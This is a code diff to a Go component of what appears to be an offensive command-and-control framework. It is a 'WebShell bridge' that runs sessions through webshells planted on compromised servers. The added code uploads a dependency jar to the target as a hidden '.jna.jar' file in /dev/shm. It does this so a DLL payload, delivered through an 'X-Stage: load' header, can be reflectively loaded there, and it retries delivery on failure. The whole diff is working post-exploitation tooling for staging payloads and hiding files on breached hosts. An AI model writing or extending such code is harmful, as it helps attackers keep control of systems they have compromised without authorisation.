@@ -6,7 +6,9 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"path/filepath"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 
@@ -33,7 +35,7 @@ const (
 )
 
 // Bridge is the WebShell bridge that connects to the IoM server via
-// ListenerRPC and manages webshell-backed sessions through a suo5 tunnel.
+// ListenerRPC and manages webshell-backed sessions through HTTP endpoints.
 //
 // The bridge owns the listener runtime only. Custom pipelines are created and
 // controlled through pipeline start/stop events from the server.
@@ -127,6 +129,7 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 	}
 
 	dllDelivered := false
+	depsDelivered := false
 	delay := retryBaseDelay
 	for attempt := 1; attempt <= retryMaxAttempts; attempt++ {
 		select {
@@ -136,6 +139,26 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 		}
 
 		if err := channel.Connect(ctx); err != nil {
+			// Deliver dependency jars (e.g., jna.jar) before DLL load.
+			// JSP needs jna.jar for JNA resolution during DLL loading,
+			// so deps must be present before the DLL can be reflectively loaded.
+			if b.cfg.DepsDir != "" && !depsDelivered {
+				needDeps := true
+				if channel.lastStatus != nil && channel.lastStatus.DepsPresent {
+					needDeps = false
+					logs.Log.Debug("deps already present on target, skipping delivery")
+					depsDelivered = true
+				}
+				if needDeps {
+					logs.Log.Important("delivering dependency jars before DLL load")
+					if depErr := b.deliverDeps(ctx, channel); depErr != nil {
+						logs.Log.Warnf("deps delivery failed (attempt %d/%d): %v", attempt, retryMaxAttempts, depErr)
+					} else {
+						depsDelivered = true
+					}
+				}
+			}
+
 			// Auto-load DLL if we have it and haven't delivered yet.
 			if dllBytes != nil && !dllDelivered {
 				logs.Log.Importantf("DLL not loaded, delivering via X-Stage: load (%d bytes)", len(dllBytes))
@@ -180,6 +203,31 @@ func (b *Bridge) connectDLL(ctx context.Context, runtime *pipelineRuntime) error
 
 	channel.StartRecvLoop()
 	runtime.sessions.Store(sess.ID, sess)
+	return nil
+}
+
+// deliverDeps uploads dependency jars from --deps directory to the webshell.
+// Files matching *.jar are sent with fixed name ".jna.jar" to /dev/shm on target.
+func (b *Bridge) deliverDeps(ctx context.Context, channel *Channel) error {
+	entries, err := os.ReadDir(b.cfg.DepsDir)
+	if err != nil {
+		return fmt.Errorf("read deps dir %s: %w", b.cfg.DepsDir, err)
+	}
+	for _, entry := range entries {
+		if entry.IsDir() || !strings.HasSuffix(strings.ToLower(entry.Name()), ".jar") {
+			continue
+		}
+		data, err := os.ReadFile(filepath.Join(b.cfg.DepsDir, entry.Name()))
+		if err != nil {
+			return fmt.Errorf("read dep %s: %w", entry.Name(), err)
+		}
+		// Fixed name: JSP expects .jna.jar at /dev/shm
+		if err := channel.DeliverDep(ctx, ".jna.jar", data); err != nil {
+			return fmt.Errorf("deliver %s as .jna.jar: %w", entry.Name(), err)
+		}
+		logs.Log.Importantf("delivered %s as .jna.jar (%d bytes)", entry.Name(), len(data))
+		break // only deliver one jar
+	}
 	return nil
 }
 
